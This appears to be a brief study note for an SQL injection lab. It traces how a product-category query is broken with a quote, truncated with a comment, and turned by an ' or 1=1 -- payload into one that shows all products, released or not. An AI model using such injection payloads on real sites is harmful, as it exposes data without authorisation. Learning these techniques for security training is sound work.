SQL Injection Product category

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

End goal : display all products in any category, both released and unreleased.

SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''--' AND released = 1

SELECT * FROM products WHERE category = ''-- {This will run in the background: Displaying Nothing}

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1